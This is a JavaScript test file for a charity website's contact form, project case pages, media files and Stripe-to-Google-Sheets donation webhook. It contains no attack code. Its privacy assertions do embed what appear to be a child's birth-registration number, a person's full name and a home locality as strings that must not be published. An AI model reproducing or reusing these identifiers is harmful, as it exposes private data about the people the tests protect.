  assert.match(siteCss, /@media \(max-width: 720px\)[\s\S]*?\.contact-flow-grid \{[\s\S]*?gap: 2rem/);
  const messageDecorationRule = siteCss.slice(
    siteCss.indexOf(".contact-message-card::before"),
    siteCss.indexOf(".contact-method-icon"),
  );
  assert.doesNotMatch(messageDecorationRule, /animation\s*:/);

  assert.doesNotMatch(siteJs, /contact-message-card/);
  assert.match(siteJs, /const buildContactMailtoUrl =/);
  assert.match(siteJs, /field\.validity\.typeMismatch/);
  assert.match(siteJs, /field\.toggleAttribute\("aria-invalid", Boolean\(error\)\)/);
  assert.match(siteJs, /contactForm\.dataset\.submitting = "true"/);
  assert.match(siteJs, /contactSubmit\.disabled = true/);
  assert.match(siteJs, /contactSubmitLabel\.textContent = "Opening email\\u2026"/);
  assert.match(siteJs, /window\.location\.href = mailtoUrl/);
  assert.match(siteJs, /Your email app is ready\. Send the drafted message to finish\./);
  assert.match(siteJs, /We couldn't open your email app/);
  assert.match(siteJs, /rootMargin: "0px 0px 22% 0px"/);

  const helperStart = siteJs.indexOf("  const CONTACT_EMAIL =");
  const helperEnd = siteJs.indexOf("\n\n  if (contactForm)", helperStart);
  assert.ok(helperStart >= 0 && helperEnd > helperStart, "contact mailto helper should remain available");
  const helperContext = {};
  runInNewContext(
    `${siteJs.slice(helperStart, helperEnd)}\n` +
      "globalThis.__buildContactMailtoUrl = buildContactMailtoUrl;",
    helperContext,
  );
  const contactMailto = helperContext.__buildContactMailtoUrl({
    name: "Test Donor",
    email: "donor@example.com",
    message: "I have a receipt question.",
  });
  const mailtoUrl = new URL(contactMailto);
  const mailtoParams = new URLSearchParams(mailtoUrl.search);
  assert.equal(mailtoUrl.protocol, "mailto:");
  assert.equal(mailtoUrl.pathname, "Oneworldrelief.fma@gmail.com");
  assert.equal(mailtoParams.get("subject"), "One World Relief question");
  assert.equal(mailtoParams.get("body"), "Name: Test Donor\nEmail: donor@example.com\n\nI have a receipt question.");
});

test("about page shows nonprofit status and EIN without a public home address", async () => {
  const [aboutHtml, siteCss] = await Promise.all([
    readFile("about.html", "utf8"),
    readFile("one-world-relief.css", "utf8"),
  ]);

  assert.match(aboutHtml, /Organization Details/);
  assert.match(aboutHtml, /official-panel/);
  assert.match(aboutHtml, /official-details/);
  assert.match(aboutHtml, /501\(c\)\(3\) nonprofit organization/);
  assert.match(aboutHtml, /EIN/);
  assert.match(aboutHtml, /41-5079927/);
  assert.match(aboutHtml, /tax-deductible to the extent allowed by law/);
  assert.match(aboutHtml, /Available upon request/);
  assert.doesNotMatch(aboutHtml, /Owned by Fahadbin Alam/);
  assert.doesNotMatch(aboutHtml, /Middle Patenga/);
  assert.match(siteCss, /\.official-panel/);
  assert.match(siteCss, /\.official-details/);
});

test("project cards publish approved cases with embedded local media", async () => {
  const [
    projectData,
    siteJs,
    siteCss,
    casePage,
    caseTwoPage,
    caseThreePage,
    caseFourPage,
    caseFivePage,
    caseSixPage,
    caseSevenPage,
    caseEightPage,
    caseNinePage,
  ] = await Promise.all([
    readFile("project-data.js", "utf8"),
    readFile("one-world-relief.js", "utf8"),
    readFile("one-world-relief.css", "utf8"),
    readFile("projects/case-001.html", "utf8"),
    readFile("projects/case-002.html", "utf8"),
    readFile("projects/case-003.html", "utf8"),
    readFile("projects/case-004.html", "utf8"),
    readFile("projects/case-005.html", "utf8"),
    readFile("projects/case-006.html", "utf8"),
    readFile("projects/case-007.html", "utf8"),
    readFile("projects/case-008.html", "utf8"),
    readFile("projects/case-009.html", "utf8"),
  ]);

  assert.doesNotMatch(projectData, /drive\.google\.com/);
  assert.doesNotMatch(projectData, /youtube\.com/);
  assert.match(projectData, /projects\/case-001\.html/);
  assert.match(projectData, /projects\/case-002\.html/);
  assert.match(projectData, /projects\/case-003\.html/);
  assert.match(projectData, /projects\/case-004\.html/);
  assert.match(projectData, /projects\/case-005\.html/);
  assert.match(projectData, /projects\/case-006\.html/);
  assert.match(projectData, /projects\/case-007\.html/);
  assert.match(projectData, /projects\/case-008\.html/);
  assert.match(projectData, /projects\/case-009\.html/);
  assert.doesNotMatch(projectData, /Village Qurbani Meal Support/);
  assert.doesNotMatch(projectData, /Two-Year Orphan Education Support/);
  assert.doesNotMatch(projectData, /Food Stand for a Father/);
  assert.doesNotMatch(projectData, /title: "Case 001:/);
  assert.doesNotMatch(projectData, /title: "Case 002:/);
  assert.doesNotMatch(projectData, /title: "Case 003:/);
  assert.doesNotMatch(projectData, /title: "Case 004:/);
  assert.doesNotMatch(projectData, /title:\s*"Case \d{3}\b/i);
  assert.match(projectData, /Keeping a Hafiz Student in School/);
  assert.match(projectData, /A Fresh Start for a Father's Business/);
  assert.match(projectData, /Keeping an Orphan Boy in School/);
  assert.match(projectData, /Feeding Madrasa for Orphan Kids/);
  assert.match(projectData, /Food Relief for Flood-Affected Families/);
  assert.match(projectData, /A Secure Gate for a Community Mosque/);
  assert.match(projectData, /Water for a Madrasa Mosque/);
  assert.match(projectData, /Tiles to Help Finish a Mosque/);
  assert.match(projectData, /Twenty Ceiling Fans for a New Mosque/);
  assert.match(projectData, /orphan-support-001-thumbnail\.jpg/);
  assert.match(projectData, /livelihood-support-002-thumbnail\.jpg/);
  assert.match(projectData, /orphan-education-003-thumbnail\.jpg/);
  assert.match(projectData, /flood-relief-005-thumbnail\.jpg/);
  assert.match(projectData, /mosque-gate-006-thumbnail\.jpg/);
  assert.match(projectData, /mosque-fans-009-thumbnail\.jpg/);
  assert.match(projectData, /thumbnailType: "banner"/);
  assert.doesNotMatch(projectData, /orphan-education-003-placeholder\.svg/);
  assert.doesNotMatch(projectData, /korbani-village-004-placeholder\.svg/);
  assert.match(siteJs, /project-\$\{caseId\}/);
  assert.match(siteCss, /\.project-card\.project-case-003 \.project-media img/);
  assert.match(siteCss, /object-position: center 70%/);
  assert.match(siteJs, /project-media-banner/);
  assert.match(siteCss, /\.current-case-banner/);

  assert.match(casePage, /Keeping a Hafiz student in school/);
  assert.match(casePage, /Case ID/);
  assert.match(casePage, /Case 001/);
  assert.match(casePage, /orphan-support-001-video-1\.mp4/);
  assert.match(casePage, /orphan-support-001-video-2\.mp4/);
  assert.match(casePage, /orphan-support-001-primary\.mp4/);
  assert.match(casePage, /orphan-support-001-main\.jpg/);
  assert.match(casePage, /orphan-support-001-proof\.jpg/);
  assert.match(casePage, /project-timeline/);
  assert.match(casePage, /id="case-timeline"/);
  assert.match(casePage, /timeline-step-active/);
  assert.match(siteCss, /\.project-timeline::after/);
  assert.match(siteCss, /timeline-runner-horizontal/);
  assert.match(siteCss, /timeline-runner-vertical/);
  assert.match(siteCss, /timeline-ring-breathe/);
  assert.match(siteJs, /hashReveal/);

  assert.match(caseTwoPage, /A fresh start for a father's business/);
  assert.match(caseTwoPage, /Case ID/);
  assert.match(caseTwoPage, /Case 002/);
  assert.match(caseTwoPage, /livelihood-support-002-primary\.mp4/);
  assert.match(caseTwoPage, /livelihood-support-002-main\.jpg/);
  assert.match(caseTwoPage, /livelihood-support-002-proof\.jpg/);
  assert.match(caseTwoPage, /livelihood-support-002-thumbnail\.jpg/);
  assert.match(caseTwoPage, /Personal identity documents and home address details are kept off the public website/);
  assert.doesNotMatch(caseTwoPage, /NID No/);
  assert.doesNotMatch(caseTwoPage, /Middle Patenga/);
  assert.match(caseTwoPage, /project-timeline/);
  assert.match(caseTwoPage, /timeline-step-active/);

  assert.match(caseThreePage, /Keeping an orphan boy in school/);
  assert.match(caseThreePage, /Case 003/);
  assert.match(caseThreePage, /Amount delivered/);
  assert.match(caseThreePage, /\$400/);
  assert.match(caseThreePage, /Completed/);
  assert.match(caseThreePage, /orphan-education-003-primary\.mp4/);
  assert.match(caseThreePage, /orphan-education-003-video-2\.mp4/);
  assert.match(caseThreePage, /orphan-education-003-main\.jpg/);
  assert.match(caseThreePage, /orphan-education-003-proof\.jpg/);
  assert.match(caseThreePage, /Private identity and birth-registration documents are kept on file/);
  assert.doesNotMatch(caseThreePage, /orphan-education-003-placeholder\.svg/);
  assert.doesNotMatch(caseThreePage, /Birth Registration Number/);
  assert.doesNotMatch(caseThreePage, /20171591629107850/);
  assert.match(caseThreePage, /project-timeline/);
  assert.match(caseThreePage, /timeline-step-maintenance/);

  const caseFourData = projectData.split(/\r?\n  \},\r?\n  \{/).find((entry) => /date: "Case 004"/.test(entry));
  assert.ok(caseFourData);
  assert.match(caseFourData, /title: "Feeding Madrasa for Orphan Kids"/);
  assert.match(caseFourData, /donationLabel: "Feeding Madrasa for Orphan Kids"/);
  assert.match(caseFourData, /status: "Completed"/);
  assert.match(caseFourData, /amountRaised: "\$400"/);
  assert.doesNotMatch(caseFourData, /Amount not published/);
  assert.match(caseFourData, /thumbnailUrl: "assets\/projects\/case-004\/korbani-meals-004-thumbnail\.jpg"/);
  assert.match(caseFourData, /June 24, 2026/);
  assert.match(caseFourPage, /<title>One World Relief \| Feeding Madrasa for Orphan Kids<\/title>/);
  assert.match(caseFourPage, /<h1>Feeding Madrasa for Orphan Kids<\/h1>/);
  assert.match(caseFourPage, /Case 004/);
  assert.match(caseFourPage, /<strong>Completed<\/strong>/);
  assert.match(caseFourPage, /<span>Project cost<\/span><strong>\$400<\/strong>/);
  assert.doesNotMatch(caseFourPage, /Amount not published|<strong>Not published<\/strong>/);
  assert.match(caseFourPage, /June 24, 2026/);
  assert.match(caseFourPage, /korbani-meals-004-primary\.mp4/);
  assert.match(caseFourPage, /korbani-meals-004-thumbnail\.jpg/);
  assert.match(caseFourPage, /korbani-meals-004-main\.jpg/);
  assert.match(caseFourPage, /korbani-meals-004-proof\.jpg/);
  assert.match(caseFourPage, /The confirmed project cost is \$400\. No meal count or beneficiary count was supplied/);
  assert.doesNotMatch(caseFourPage, /Korbani meals for a village|No public budget/);
  assert.doesNotMatch(caseFourPage, /Current Case|current-case-banner|Ongoing|Media coming soon/);
  assert.doesNotMatch(caseFourPage, /korbani-village-004-placeholder\.svg/);
  assert.match(caseFourPage, /project-timeline/);
  assert.match(caseFourPage, /<h3>Meal served<\/h3>/);

  const caseFiveData = projectData.split(/\r?\n  \},\r?\n  \{/).find((entry) => /date: "Case 005"/.test(entry));
  assert.ok(caseFiveData);
  assert.match(caseFiveData, /title: "Food Relief for Flood-Affected Families"/);
  assert.match(caseFiveData, /status: "Completed"/);
  assert.match(caseFiveData, /amountRaised: "\$450"/);
  assert.match(caseFiveData, /thumbnailUrl: "assets\/projects\/case-005\/flood-relief-005-thumbnail\.jpg"/);
  assert.match(caseFiveData, /mediaUrl: "projects\/case-005\.html"/);

  const caseFiveMedia = [
    "flood-relief-005-thumbnail.jpg",
    "flood-relief-005-main.jpg",
    "flood-relief-005-context.jpg",
    "flood-relief-005-supplies.jpg",
    "flood-relief-005-banner.jpg",
    "flood-relief-005-delivery.jpg",
    "flood-relief-005-primary.mp4",
    "flood-relief-005-video-2.mp4",
    "flood-relief-005-video-3.mp4",
    "flood-relief-005-children-community.jpg",
    "flood-relief-005-child-delivery.jpg",
  ];
  assert.match(caseFivePage, /<h1>Food Relief for Flood-Affected Families<\/h1>/);
  assert.match(caseFivePage, /<strong>Completed<\/strong>/);
  assert.match(caseFivePage, /<span>Project cost<\/span><strong>\$450<\/strong>/);
  assert.match(caseFivePage, /July 15-16, 2026/);
  assert.match(caseFivePage, /project-timeline/);
  assert.match(caseFivePage, /timeline-step-maintenance/);
  assert.match(caseFivePage, /<h3>Case completed<\/h3>/);
  assert.match(caseFivePage, /personal details beyond the approved field media are not published/);
  assert.match(caseFivePage, /unlisted personal and financial details remained private/);
  assert.doesNotMatch(caseFivePage, /NID No|Birth Registration Number|Middle Patenga/);
  assert.doesNotMatch(caseFivePage, /FahadBin Mihad Alam|children-flood-context/);
  for (const filename of caseFiveMedia) {
    assert.ok(caseFivePage.includes(filename), `Case 005 page should include ${filename}`);
  }

  const caseSixData = projectData.split(/\r?\n  \},\r?\n  \{/).find((entry) => /date: "Case 006"/.test(entry));
  assert.ok(caseSixData);
  assert.match(caseSixData, /title: "A Secure Gate for a Community Mosque"/);
  assert.match(caseSixData, /status: "Completed"/);
  assert.match(caseSixData, /amountRaised: "\$170"/);
  assert.match(caseSixData, /thumbnailUrl: "assets\/projects\/case-006\/mosque-gate-006-thumbnail\.jpg"/);
  assert.match(caseSixData, /mediaUrl: "projects\/case-006\.html"/);

  const caseSixMedia = [
    "mosque-gate-006-thumbnail.jpg",
    "mosque-gate-006-main.jpg",
    "mosque-gate-006-primary.mp4",
    "mosque-gate-006-video-2.mp4",
  ];
  assert.match(caseSixPage, /<h1>A Secure Gate for a Community Mosque<\/h1>/);
  assert.match(caseSixPage, /<strong>Completed<\/strong>/);
  assert.match(caseSixPage, /<span>Project cost<\/span><strong>\$170<\/strong>/);
  assert.match(caseSixPage, /July 27-31, 2026/);
  assert.match(caseSixPage, /project-timeline/);
  assert.match(caseSixPage, /timeline-step-maintenance/);
  assert.match(caseSixPage, /<h3>Case completed<\/h3>/);
  assert.match(caseSixPage, /unrelated personal details are not included on this page/);
  assert.match(caseSixPage, /without adding unlisted project or personal details/);
  assert.doesNotMatch(caseSixPage, /NID No|Birth Registration Number|Middle Patenga/);
  for (const filename of caseSixMedia) {
    assert.ok(caseSixPage.includes(filename), `Case 006 page should include ${filename}`);
  }

  const caseSevenData = projectData.split(/\r?\n  \},\r?\n  \{/).find((entry) => /date: "Case 007"/.test(entry));
  const caseEightData = projectData.split(/\r?\n  \},\r?\n  \{/).find((entry) => /date: "Case 008"/.test(entry));
  assert.ok(caseSevenData);
  assert.ok(caseEightData);
  for (const [entry, title, page] of [
    [caseSevenData, "Water for a Madrasa Mosque", caseSevenPage],
    [caseEightData, "Tiles to Help Finish a Mosque", caseEightPage],
  ]) {
    assert.ok(entry.includes(`title: "${title}"`));
    assert.match(entry, /status: "Coming Soon"/);
    assert.match(entry, /location: ""/);
    assert.match(entry, /amountRaised: "Budget coming soon"/);
    assert.match(entry, /thumbnailType: "banner"/);
    assert.match(entry, /thumbnailLabel: "Coming Soon"/);
    assert.match(page, /Coming Soon/);
    assert.match(page, /To be announced/);
    assert.match(page, /timeline-step-pending/);
    assert.doesNotMatch(page, /Bangladesh|\$\d+|2026-\d{2}-\d{2}/);
  }
  assert.match(caseSevenPage, /Water for a madrasa mosque/);
  assert.match(caseEightPage, /Tiles to help finish a mosque/);
  assert.match(caseSevenData, /program=water_support&variant=water_station&amount=350&referrer=case-007/);
  assert.match(caseEightData, /program=mosque_build&amount=1000&referrer=case-008/);
  assert.match(caseSevenPage, /program=water_support&amp;variant=water_station&amp;amount=350&amp;referrer=case-007/);
  assert.match(caseEightPage, /program=mosque_build&amp;amount=1000&amp;referrer=case-008/);
  assert.doesNotMatch(`${caseSevenData}\n${caseEightData}`, /campaign=General%20Fund/);
  assert.match(caseNinePage, /<h1>Twenty Ceiling Fans for a New Mosque<\/h1>/);
  assert.match(caseNinePage, /Case 009/);
  assert.match(siteJs, /const comingSoon =/);
  assert.match(siteJs, /<span>\$\{comingSoon\} coming soon<\/span>/);
  assert.match(siteJs, /project\.thumbnailLabel \|\| "Current Case"/);
  assert.match(siteJs, /\[location, date\]\.filter\(Boolean\)\.join\(" &middot; "\)/);

  const jpegFiles = [...caseFiveMedia, ...caseSixMedia].filter((filename) => filename.endsWith(".jpg"));
  const mp4Files = [...caseFiveMedia, ...caseSixMedia].filter((filename) => filename.endsWith(".mp4"));
  for (const filename of jpegFiles) {
    const caseFolder = filename.includes("005") ? "case-005" : "case-006";
    const media = await readFile(`assets/projects/${caseFolder}/${filename}`);
    assert.ok(media.byteLength > 50_000, `${filename} should contain a usable image`);
    assert.ok(media.byteLength < 1_500_000, `${filename} should remain web-sized`);
    assert.deepEqual([...media.subarray(0, 3)], [0xff, 0xd8, 0xff], `${filename} should have a JPEG signature`);
    assert.deepEqual([...media.subarray(-2)], [0xff, 0xd9], `${filename} should be a complete JPEG`);
  }
  for (const filename of mp4Files) {
    const caseFolder = filename.includes("005") ? "case-005" : "case-006";
    const media = await readFile(`assets/projects/${caseFolder}/${filename}`);
    assert.ok(media.byteLength > 1_000_000, `${filename} should contain a usable video`);
    assert.ok(media.byteLength < 25 * 1024 * 1024, `${filename} should remain deployable as a site asset`);
    assert.equal(media.subarray(4, 8).toString("ascii"), "ftyp", `${filename} should be an ISO MP4`);
    assert.ok(media.includes(Buffer.from("avc1")), `${filename} should use browser-safe H.264 video`);
    assert.ok(media.includes(Buffer.from("mp4a")), `${filename} should use browser-safe AAC audio`);
  }
});

test("Case 009 publishes verified mosque-fan proof without private correspondence or image metadata", async () => {
  const [projectDataSource, casePage, mediaReadme] = await Promise.all([
    readFile("project-data.js", "utf8"),
    readFile("projects/case-009.html", "utf8"),
    readFile("assets/projects/README.md", "utf8"),
  ]);
  const projectContext = { window: {} };
  runInNewContext(projectDataSource, projectContext);
  const projects = JSON.parse(JSON.stringify(projectContext.window.ONE_WORLD_RELIEF_PROJECTS));
  const caseNine = projects.find((project) => project.date === "Case 009");

  assert.equal(projects.length, 9);
  assert.equal(projects.filter((project) => project.status === "Completed").length, 7);
  assert.ok(caseNine, "Case 009 should be present in shared project data");
  assert.deepEqual(
    {
      title: caseNine.title,
      category: caseNine.category,
      status: caseNine.status,
      location: caseNine.location,
      amountRaised: caseNine.amountRaised,
      acceptsDonations: caseNine.acceptsDonations,
      thumbnailUrl: caseNine.thumbnailUrl,
      mediaUrl: caseNine.mediaUrl,
    },
    {
      title: "Twenty Ceiling Fans for a New Mosque",
      category: "Mosque Support",
      status: "Completed",
      location: "Bangladesh",
      amountRaised: "Cost not publicly listed",
      acceptsDonations: false,
      thumbnailUrl: "assets/projects/case-009/mosque-fans-009-thumbnail.jpg",
      mediaUrl: "projects/case-009.html",
    },
  );
  assert.match(caseNine.impact, /20 ceiling fans installed/);
  assert.match(caseNine.update, /September 24, 2025/);
  assert.equal(caseNine.donationUrl, "donate.html?program=mosque_build&amount=1000&referrer=case-009#donationForm");

  assert.match(casePage, /<title>One World Relief \| Twenty Ceiling Fans for a New Mosque<\/title>/);
  assert.match(casePage, /<meta name="description" content="Completed Case 009 documenting 20 ceiling fans installed at a newly built mosque in Bangladesh\." \/>/);
  assert.match(casePage, /<strong>Not publicly listed<\/strong>/);
  assert.match(casePage, /<strong>September 24, 2025<\/strong>/);
  assert.match(casePage, /<time datetime="2025-09-24">September 24, 2025<\/time>/);
  assert.match(casePage, /The supplied project record confirms a donation of 20 ceiling fans/);
  assert.match(casePage, /does not\s+estimate either figure/);
  assert.match(casePage, /Private correspondence, phone numbers, donor names, and embedded photo\s+metadata are not included/);
  assert.match(casePage, /program=mosque_build&amp;amount=1000&amp;referrer=case-009#donationForm/);
  assert.match(mediaReadme, /case-009\/.*metadata-stripped.*20 ceiling fans/);
  assert.match(mediaReadme, /private correspondence with a phone number remains unpublished/);

  const publicCaseText = `${JSON.stringify(caseNine)}\n${casePage}`;
  assert.doesNotMatch(publicCaseText, /(?:\+?88)?01[3-9]\d{8}/, "Bangladesh phone numbers must remain private");
  assert.doesNotMatch(publicCaseText, /href="tel:|Facebook\.html|\.download|Request for Donation of Tiles/i);
  assert.doesNotMatch(publicCaseText, /\b\d{15,}\b/, "source-system or identity numbers must not be published");

  const jpegFiles = [
    "mosque-fans-009-thumbnail.jpg",
    "mosque-fans-009-main.jpg",
    "mosque-fans-009-proof.jpg",
  ];
  assert.match(casePage, /mosque-fans-009-main\.jpg/);
  assert.match(casePage, /mosque-fans-009-proof\.jpg/);
  assert.doesNotMatch(casePage, /src="[^"]+\.(?:html|download|webp)"/i);

  for (const filename of jpegFiles) {
    const media = await readFile(`assets/projects/case-009/${filename}`);
    const metadataText = media.toString("latin1");
    assert.ok(media.byteLength > 50_000, `${filename} should contain a usable image`);
    assert.ok(media.byteLength < 1_500_000, `${filename} should remain web-sized`);
    assert.deepEqual([...media.subarray(0, 3)], [0xff, 0xd8, 0xff], `${filename} should have a JPEG signature`);
    assert.deepEqual([...media.subarray(-2)], [0xff, 0xd9], `${filename} should be a complete JPEG`);
    assert.doesNotMatch(metadataText, /Exif|GPS|Photoshop 3\.0|http:\/\/ns\.adobe\.com\/xap/i, `${filename} should not retain sensitive image metadata`);
    assert.doesNotMatch(metadataText, /(?:\+?88)?01[3-9]\d{8}/, `${filename} should not embed a phone number`);
  }
});

test("Case 004 publishes stripped, deployable meal proof media", async () => {
  const jpegFiles = [
    "korbani-meals-004-thumbnail.jpg",
    "korbani-meals-004-main.jpg",
    "korbani-meals-004-proof.jpg",
  ];

  for (const filename of jpegFiles) {
    const media = await readFile(`assets/projects/case-004/${filename}`);
    assert.ok(media.byteLength > 50_000, `${filename} should contain a usable image`);
    assert.ok(media.byteLength < 1_500_000, `${filename} should remain web-sized`);
    assert.deepEqual([...media.subarray(0, 3)], [0xff, 0xd8, 0xff], `${filename} should have a JPEG signature`);
    assert.deepEqual([...media.subarray(-2)], [0xff, 0xd9], `${filename} should be a complete JPEG`);
    assert.equal(media.includes(Buffer.from("Exif")), false, `${filename} should not retain EXIF metadata`);
  }

  const video = await readFile("assets/projects/case-004/korbani-meals-004-primary.mp4");
  assert.ok(video.byteLength > 1_000_000, "Case 004 video should contain usable proof media");
  assert.ok(video.byteLength < 25 * 1024 * 1024, "Case 004 video should remain below Cloudflare's per-file limit");
  assert.equal(video.subarray(4, 8).toString("ascii"), "ftyp", "Case 004 video should be an ISO MP4");
  assert.ok(video.includes(Buffer.from("avc1")), "Case 004 video should use browser-safe H.264 video");
  assert.ok(video.includes(Buffer.from("mp4a")), "Case 004 video should use browser-safe AAC audio");
  assert.equal(video.includes(Buffer.from("location")), false, "Case 004 video should not retain location metadata");
});

test("projects page opens directly into project content", async () => {
  const projectsHtml = await readFile("projects.html", "utf8");

  assert.doesNotMatch(projectsHtml, /See where donations go/);
  assert.doesNotMatch(projectsHtml, /Clear giving categories/);
  assert.doesNotMatch(projectsHtml, /<section class="page-hero reveal">/);
  assert.match(projectsHtml, /project-filter-section/);
  assert.match(projectsHtml, /aria-label="Project filters"/);
  assert.match(projectsHtml, /id="projectBoard"/);
});

test("stripe webhook rejects invalid signatures", async () => {
  const webhook = await importFunctionModule("functions/charity/webhooks/stripe.js");
  const response = await webhook.onRequestPost({
    request: new Request("https://one-world-relief.org/charity/webhooks/stripe", {
      method: "POST",
      headers: { "stripe-signature": "t=1770000000,v1=bad" },
      body: JSON.stringify({ type: "checkout.session.completed" }),
    }),
    env: { OWR_STRIPE_WEBHOOK_SECRET: "whsec_test" },
  });

  assert.equal(response.status, 400);
});

test("stripe webhook returns 500 so Stripe retries when Sheets is not configured", async () => {
  const webhook = await importFunctionModule("functions/charity/webhooks/stripe.js");
  const secret = "whsec_test";
  const timestamp = "1770000000";
  const body = JSON.stringify({
    id: "evt_test",
    type: "checkout.session.completed",
    data: {
      object: {
        id: "cs_test_123",
        created: 1770000000,
        amount_total: 100,
        payment_status: "paid",
        customer_email: "donor@example.com",
        client_reference_id: "don_123",
        metadata: {
          donation_id: "don_123",
          donor_name: "Test Donor",
          donor_email: "donor@example.com",
          campaign: "General Fund",
          donor_note: "For school supplies",
          anonymous_public: "yes",
        },
      },
    },
  });
  const signature = createHmac("sha256", secret).update(`${timestamp}.${body}`).digest("hex");

  const response = await webhook.onRequestPost({
    request: new Request("https://one-world-relief.org/charity/webhooks/stripe", {
      method: "POST",
      headers: { "stripe-signature": `t=${timestamp},v1=${signature}` },
      body,
    }),
    env: { OWR_STRIPE_WEBHOOK_SECRET: secret },
  });

  assert.equal(response.status, 500);
});

test("stripe webhook sends custom OneWorld Relief receipt email when configured", async () => {
  const webhook = await importFunctionModule("functions/charity/webhooks/stripe.js");
  const originalFetch = globalThis.fetch;
  const secret = "whsec_test";
  const timestamp = "1770000000";
  const calls = [];
  const body = JSON.stringify({
    id: "evt_test",
    type: "checkout.session.completed",
    data: {
      object: {
        id: "cs_test_123",
        created: 1770000000,
        amount_total: 35000,
        payment_status: "paid",
        customer_email: "donor@example.com",
        client_reference_id: "don_123",
        payment_intent: "pi_test_123",
        metadata: {
          donation_id: "don_123",
          donor_name: "Test Donor",
          donor_email: "donor@example.com",
          campaign: "Water Support",
          program_id: "water_support",
          program_variant: "water_station",
          referrer_case: "case-009",
          donor_note: "For school supplies",
          anonymous_public: "yes",
        },
      },
    },
  });
  const signature = createHmac("sha256", secret).update(`${timestamp}.${body}`).digest("hex");

  globalThis.fetch = async (url, options) => {
    calls.push({ url: String(url), options });
    if (String(url).includes("oauth2.googleapis.com")) {
      return new Response(JSON.stringify({ access_token: "google-token" }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    if (String(url).includes("api.resend.com")) {
      return new Response(JSON.stringify({ id: "email_123" }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    if (String(url).includes("sheets.googleapis.com") && !String(url).includes(":append")) {
      return new Response(JSON.stringify({ values: [["Donation ID", "Date", "Donor Name", "Amount ($)", "Purpose/Fund", "Method", "Receipt ID", "Notes"]] }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    if (String(url).includes("sheets.googleapis.com") && String(url).includes(":append")) {
      return new Response(JSON.stringify({ updates: { updatedRows: 1 } }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    throw new Error(`Unexpected fetch ${url}`);
  };

  try {
    const privateKey = await createGooglePrivateKey();

    const response = await webhook.onRequestPost({
      request: new Request("https://one-world-relief.org/charity/webhooks/stripe", {
        method: "POST",
        headers: { "stripe-signature": `t=${timestamp},v1=${signature}` },
        body,
      }),
      env: {
        OWR_STRIPE_WEBHOOK_SECRET: secret,
        OWR_GOOGLE_SHEET_ID: "sheet_123",
        OWR_GOOGLE_SHEET_TAB: "Donations (2026)",
        OWR_GOOGLE_SERVICE_ACCOUNT_EMAIL: "service@example.iam.gserviceaccount.com",
        OWR_GOOGLE_PRIVATE_KEY: privateKey,
        OWR_PUBLIC_SITE_URL: "https://one-world-relief.org",
        OWR_RESEND_API_KEY: "re_test",
        OWR_RECEIPT_FROM_EMAIL: "OneWorld Relief <receipts@one-world-relief.org>",
      },
    });

    assert.equal(response.status, 200);
    const emailCall = calls.find((call) => call.url.includes("api.resend.com"));
    assert.ok(emailCall, "custom receipt email should be sent");
    const emailPayload = JSON.parse(emailCall.options.body);
    assert.deepEqual(emailPayload.to, ["donor@example.com"]);
    assert.match(emailPayload.subject, /OneWorld Relief donation receipt R-2026-02-02-/);
    assert.match(emailPayload.text, /OneWorld Relief\nEIN: 41-5079927/);
    assert.match(emailPayload.text, /Receipt ID: R-2026-02-02-/);
    assert.match(emailPayload.text, /Donor Name: Test Donor/);
    assert.match(emailPayload.text, /Amount: \$350\.00/);
    assert.match(emailPayload.text, /Designation: Water Support/);
    assert.match(emailPayload.text, /Program option: Filtered Water Station/);
    assert.doesNotMatch(emailPayload.text, /Program option: water_station/);
    assert.match(emailPayload.text, /No goods or services were provided/);

    const sheetReadCall = calls.find((call) => call.url.includes("sheets.googleapis.com") && !call.url.includes(":append"));
    assert.ok(sheetReadCall, "webhook should check for duplicate spreadsheet rows before sending a receipt");
    const sheetCall = calls.find((call) => call.url.includes("sheets.googleapis.com") && call.url.includes(":append"));
    assert.match(sheetCall.url, /A%3AH/);
    const sheetPayload = JSON.parse(sheetCall.options.body);
    assert.deepEqual(sheetPayload.values[0].slice(0, 7), [
      "don_123",
      "2/2/2026",
      "Test Donor",
      350,
      "Water Support",
      "Stripe",
      "R-2026-02-02-DON123",
    ]);
    assert.match(sheetPayload.values[0][7], /Receipt Email: sent/);
    assert.match(sheetPayload.values[0][7], /Payment Intent: pi_test_123/);
    assert.match(sheetPayload.values[0][7], /Program ID: water_support/);
    assert.match(sheetPayload.values[0][7], /Program Option: Filtered Water Station/);
    assert.match(sheetPayload.values[0][7], /Program Variant ID: water_station/);
    assert.match(sheetPayload.values[0][7], /Referrer Case: case-009/);
    assert.match(sheetPayload.values[0][7], /Public Display: Anonymous/);
    assert.match(sheetPayload.values[0][7], /Donor Note: For school supplies/);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("stripe webhook neutralizes formula-like Google Sheets cells without changing ordinary values", async () => {
  const [deployedSource, mirrorSource] = await Promise.all([
    readFile("functions/charity/webhooks/stripe.js", "utf8"),
    readFile("../functions/charity/webhooks/stripe.js", "utf8"),
  ]);
  assert.equal(deployedSource, mirrorSource, "Stripe webhook mirrors must remain byte-identical");

  const webhook = await importFunctionModule("functions/charity/webhooks/stripe.js");
  const originalFetch = globalThis.fetch;
  const secret = "whsec_formula_test";
  const timestamp = "1770000000";
  const calls = [];

  globalThis.fetch = async (url, options) => {
    calls.push({ url: String(url), options });
    if (String(url).includes("oauth2.googleapis.com")) {
      return new Response(JSON.stringify({ access_token: "google-token" }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    if (String(url).includes("sheets.googleapis.com") && !String(url).includes(":append")) {
      return new Response(JSON.stringify({ values: [["Donation ID", "Date", "Donor Name", "Amount ($)", "Purpose/Fund", "Method", "Receipt ID", "Notes"]] }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    if (String(url).includes("sheets.googleapis.com") && String(url).includes(":append")) {
      return new Response(JSON.stringify({ updates: { updatedRows: 1 } }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    throw new Error(`Unexpected fetch ${url}`);
  };

  try {
    const privateKey = await createGooglePrivateKey();
    const deliver = async ({ sessionId, donationId, donorName, campaign }) => {
      const body = JSON.stringify({
        id: `evt_${sessionId}`,
        type: "checkout.session.completed",
        data: {
          object: {
            id: sessionId,
            created: 1770000000,
            amount_total: 2500,
            payment_status: "paid",
            customer_email: "formula-test@example.com",
            client_reference_id: donationId,
            metadata: {
              donation_id: donationId,
              donor_name: donorName,
              donor_email: "formula-test@example.com",
